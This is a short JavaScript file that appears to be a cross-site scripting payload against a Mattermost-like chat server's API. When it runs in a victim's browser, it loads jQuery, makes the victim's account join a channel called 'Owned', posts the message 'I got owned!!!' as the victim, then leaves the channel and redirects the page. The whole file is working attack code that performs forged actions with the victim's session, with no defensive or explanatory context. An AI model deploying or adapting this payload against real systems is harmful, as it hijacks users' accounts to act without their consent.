var channel = window.channel;
var site = window.site;

// Load in JQuery
var jquery = document.createElement('script');
jquery.src = 'https://code.jquery.com/jquery-2.2.1.min.js';
document.head.appendChild(jquery);

// Next, lets add ourselves to the channel "Owned"
// POST /api/v1/channels/hash/join
$.post('/api/v1/channels/'+channel+'/join', function(data, status){
	return 0;
})

// lets say we were owned in this channel
var data = {
	"filenames": [],
	"message": "I got owned!!!",
	"channel_id": channel,
	"pending_post_id": Math.random().toString(36).substring(7),
	"user_id": "",
	"create_at":1,
	"state":"loading"
};
setTimeout(function(){
	$.post('/api/v1/channels/'+channel+'/create', JSON.stringify(data), function(retData,status){		
		setTimeout(function(){
			$.post('/api/v1/channels/'+channel+'/leave', function(data, status){
				location.href = site;
				return 0;
			});
		}, 500);
		return 0;
	});
}, 1000);
